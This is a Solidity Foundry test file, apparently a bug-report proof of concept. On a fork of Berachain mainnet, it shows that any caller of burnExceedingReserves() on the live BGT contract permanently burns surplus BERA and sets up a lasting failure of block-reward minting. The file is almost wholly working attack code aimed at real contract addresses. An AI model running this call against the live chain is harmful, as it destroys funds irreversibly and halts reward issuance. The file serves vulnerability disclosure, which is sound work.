// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// forge test --match-contract BGT_BurnReserves_PoC \
//   --fork-url https://berachain-rpc.publicnode.com -vv

interface IBGT {
    function totalSupply() external view returns (uint256);
    function burnExceedingReserves() external;
    function mint(address to, uint256 amount) external;
    function minter() external view returns (address);
}

interface IBlockRewardController {
    function getMaxBGTPerBlock() external view returns (uint256);
    function baseRate() external view returns (uint256);
}

contract BGT_BurnReserves_PoC is Test {

    IBGT constant BGT = IBGT(0x656b95E550C07a9ffe548bd4085c72418Ceb1dba);
    IBlockRewardController constant BRC =
        IBlockRewardController(0x1AE7dD7AE06F6C58B4524d9c1f816094B1bcCD8e);

    uint64 constant HISTORY_BUFFER_LENGTH = 8191;

    // Primary PoC: any address calls burnExceedingReserves() → 38.7M BERA burned
    // → mint() DoS after 8191 more blocks of minting
    function test_BurnThenMintReverts() public {
        address bgtAddr = address(BGT);
        address minter  = BGT.minter(); // BlockRewardController

        uint256 bal0        = bgtAddr.balance;
        uint256 supply0     = BGT.totalSupply();
        uint256 maxPerBlock = BRC.getMaxBGTPerBlock();
        uint256 surplus0    = bal0 - supply0;

        console.log("=== Before burn ===");
        console.log("balance    :", bal0    / 1e18, "BERA");
        console.log("totalSupply:", supply0 / 1e18, "BGT");
        console.log("surplus    :", surplus0 / 1e18, "BERA");
        console.log("maxPerBlock:", maxPerBlock / 1e18, "BGT/block");

        // Precondition: function is currently callable (surplus > 8191*maxPerBlock)
        uint256 potentialMintable = HISTORY_BUFFER_LENGTH * maxPerBlock;
        assertGt(bal0, supply0 + potentialMintable, "precondition: excess exists");

        // Step 1 — anyone (attacker) calls burnExceedingReserves()
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        BGT.burnExceedingReserves();

        uint256 bal1    = bgtAddr.balance;
        uint256 burned  = bal0 - bal1;
        uint256 surplus1 = bal1 - supply0;

        console.log("\n=== After burnExceedingReserves() ===");
        console.log("burned     :", burned   / 1e18, "BERA (permanent, sent to address(0))");
        console.log("balance    :", bal1     / 1e18, "BERA");
        console.log("surplus    :", surplus1 / 1e18, "BERA (= 8191 * maxPerBlock exactly)");

        // Verify: remaining surplus is exactly 8191 * maxPerBlock
        assertApproxEqAbs(surplus1, potentialMintable, 1e12, "surplus == 8191*maxPerBlock");

        // Step 2 — prank as BlockRewardController (minter) and mint just over the surplus
        // This simulates 8192 blocks of block reward minting (8191+1 to breach)
        uint256 mintAmount = surplus1 + 1; // 1 wei over the surplus → totalSupply > balance

        console.log("\n=== Attempting mint of surplus+1 wei ===");
        console.log("mint amount:", mintAmount / 1e18, "BGT + 1 wei");
        console.log("expected: InvariantCheckFailed revert");

        vm.prank(minter);
        vm.expectRevert(); // InvariantCheckFailed()
        BGT.mint(address(0xdead), mintAmount);

        console.log("[PASS] bgt.mint() reverts - invariant: balance >= totalSupply violated");

        // Step 3 — show normal mint (under surplus) still works
        uint256 safeMint = surplus1 - 1;
        vm.prank(minter);
        BGT.mint(address(0xdead), safeMint);
        console.log("[PASS] mint of surplus-1 succeeds - confirms the invariant boundary");

        console.log("\n=== Impact Summary ===");
        console.log("BERA burned (permanent):", burned / 1e18);
        console.log("BGT is NOT upgradeable. No receive(). No recovery path.");
        console.log("After real 8191 blocks: ALL block rewards fail permanently.");
    }

    // Control: second call is a no-op (balance <= outstanding after first burn)
    function test_SecondBurnIsNoop() public {
        BGT.burnExceedingReserves();
        uint256 bal1 = address(BGT).balance;

        BGT.burnExceedingReserves();
        uint256 bal2 = address(BGT).balance;

        assertEq(bal1, bal2, "second burn no-op");
        console.log("[PASS] second burnExceedingReserves() is a no-op");
    }
}
